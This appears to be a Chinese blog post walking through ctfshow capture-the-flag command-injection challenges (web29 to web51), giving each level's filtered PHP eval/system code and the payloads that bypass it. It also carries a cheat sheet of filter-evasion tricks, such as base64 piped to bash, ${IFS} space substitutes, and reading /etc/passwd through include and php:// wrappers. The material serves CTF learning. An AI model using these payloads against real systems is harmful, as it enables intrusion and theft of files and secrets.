@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="command绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshowcommand">
+<meta property="og:url" content="http://yoursite.com/2020/09/22/ctfshowcommand/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="command绕过">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/09/22/ctfshowcommand/1.png">
+<meta property="article:published_time" content="2020-09-22T10:37:30.000Z">
+<meta property="article:modified_time" content="2020-09-24T11:53:53.203Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="show">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/22/ctfshowcommand/1.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/09/22/ctfshowcommand/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ctfshowcommand | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/22/ctfshowcommand/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshowcommand
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-22 18:37:30" itemprop="dateCreated datePublished" datetime="2020-09-22T18:37:30+08:00">2020-09-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-24 19:53:53" itemprop="dateModified" datetime="2020-09-24T19:53:53+08:00">2020-09-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="command绕过"><a href="#command绕过" class="headerlink" title="command绕过"></a>command绕过<a id="more"></a></h3><h4 id="知识总结，写在前面"><a href="#知识总结，写在前面" class="headerlink" title="知识总结，写在前面"></a>知识总结，写在前面</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">分隔命令</span><br><span class="line">;	<span class="comment">//分号应该是最好理解的</span></span><br><span class="line">|	<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||	<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;	<span class="comment">//两条命令都会执行，不知道是不是自己姿势不对，没成功，下面也是一样</span></span><br><span class="line">&amp;&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line"></span><br><span class="line">空格绕过</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;	<span class="comment">//需要写的权限</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line">%<span class="number">3</span>c</span><br><span class="line">A=$<span class="string">'cat\x20flag'</span>&amp;&amp;$A</span><br><span class="line">A=$<span class="string">'cat\x09flag'</span>&amp;&amp;$A</span><br><span class="line">黑名单</span><br><span class="line"><span class="comment">//一般情况像flag、php这种字符会被ban掉，这时候就需要进行绕过了</span></span><br><span class="line">通配符</span><br><span class="line">*	<span class="comment">//匹配任何文本或字符串，这个通过测试发现并不能与IFS或&lt;这两个字符一起使用</span></span><br><span class="line">?	<span class="comment">//匹配单个任意字符</span></span><br><span class="line"> </span><br><span class="line">空字符</span><br><span class="line">$@	<span class="comment">//ca$@t flag</span></span><br><span class="line">$<span class="number">1</span>-$<span class="number">9</span>	<span class="comment">//ca$1t flag</span></span><br><span class="line">$&#123;数字&#125;  <span class="comment">//ca$&#123;1&#125;t flag</span></span><br><span class="line"> </span><br><span class="line">编码绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Y2F0IGZsYWcucGhwCg=="</span>|base64 -d|bash	<span class="comment">//解码为cat flag.php并执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cat flag.php"</span>|base64	<span class="comment">//最好别在在线网站编码，不然可能会将空格转成url编码，从而无法执行命令</span></span><br><span class="line"> </span><br><span class="line">变量替换</span><br><span class="line">a=t;b=g;ca$a fla$b.php</span><br><span class="line"> </span><br><span class="line">引号</span><br><span class="line">ca<span class="string">''</span>t fl<span class="string">''</span>ag.php</span><br><span class="line"></span><br><span class="line">反斜杆</span><br><span class="line"></span><br><span class="line">ca\t f\la\g.php</span><br><span class="line">Linux查看文件命令</span><br><span class="line">cat		<span class="comment">//cat flag.php</span></span><br><span class="line">tac		<span class="comment">//tac flag.php</span></span><br><span class="line">head	<span class="comment">//head flag.php</span></span><br><span class="line">tail	<span class="comment">//tail flag.php</span></span><br><span class="line">nl		<span class="comment">//nl flag.php</span></span><br><span class="line">more	<span class="comment">//more flag.php</span></span><br><span class="line">less	<span class="comment">//less flag.php</span></span><br><span class="line">od		<span class="comment">//od flag.php</span></span><br><span class="line">grep	<span class="comment">//grep 'fla' flag.php</span></span><br><span class="line">strings	<span class="comment">//strings flag.php</span></span><br><span class="line">sort	<span class="comment">//sort flag.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line">pos()：返回数组中的当前元素的值。</span><br><span class="line">array_reverse()：数组逆序</span><br><span class="line">scandir()：获取目录下的文件</span><br><span class="line">next()： 函数将内部指针指向数组中的下一个元素，并输出。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单过滤了flag,用通配符即可绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=system(<span class="string">"ls"</span>);</span><br><span class="line">c=system(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>下面的题目都只放核心部分</p>
+<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现这里过滤了php和system,影响不大，system的替代函数有很多，像是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">exec()</span><br><span class="line"><span class="comment">#这里要注意除了system都是不会给出回显的，要用诸如echo,print_r等来带出结果</span></span><br></pre></td></tr></table></figure>
+
+<p>不查看目录结构直接盲猜文件位置也是可以的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'find / -name f*'</span>);</span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>新加了几个过滤，cat,sort,shell,空格等，还是很好绕过的，上面的知识总结里有，这里就不赘述了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span>(`ls`);</span><br><span class="line">c=<span class="keyword">echo</span>(`c\at%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure>
+
+<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题过滤的东西变多了，单引号，分号，打印echo等都被过滤了</p>
+<p>这里可以尝试包含</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span><span class="string">"/etc/passwd"</span><span class="meta">?&gt;</span></span><br><span class="line">可以成功执行，考虑写入小🐎</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:<span class="number">1</span>=/etc/passwd</span><br><span class="line">最后可以用伪协议</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web33-35-payload同web32，过滤基本相同"><a href="#web33-35-payload同web32，过滤基本相同" class="headerlink" title="web33-35(payload同web32，过滤基本相同)"></a>web33-35(payload同web32，过滤基本相同)</h3><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>多过滤了数字，post传递的参数换成字母即可</p>
+<h3 id="web37-同39"><a href="#web37-同39" class="headerlink" title="web37(同39)"></a>web37(同39)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>换了形式的代码，这里会对输入进行包含，这里第一反应就是写入小马，也就是利用一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span></span><br><span class="line">相当于执行了php语句<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span>.php</span><br><span class="line">因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上</span><br></pre></td></tr></table></figure>
+
+<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|php|file/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里还是能够用data伪协议绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>还可以在UA写入一句话，包含日志文件</p>
+<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>除了字母，一些特殊字符基本都被过滤了</p>
+<p>这道题和GXY禁止套娃解法相同，利用特殊的函数进行绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">具体函数功能看最前部分</span><br></pre></td></tr></table></figure>
+
+<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里涉及到linux命令中的分隔符，前面总结中有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls;</span><br><span class="line">c=cat flag.php;||c=cat f*;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了分隔符引号和文本读取cat</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>多过滤了flag，通配符即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>多了个空格被过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at%<span class="number">09</span>f*||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>增加数字过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br><span class="line">c=nl&lt;fl<span class="string">''</span>ag.php||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上题的payload能打通</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>同上题payload，增加的过滤无影响</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>多过滤了百分号，同上题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>
+
+<h3 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>增加十六进制对制表符等的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>
+
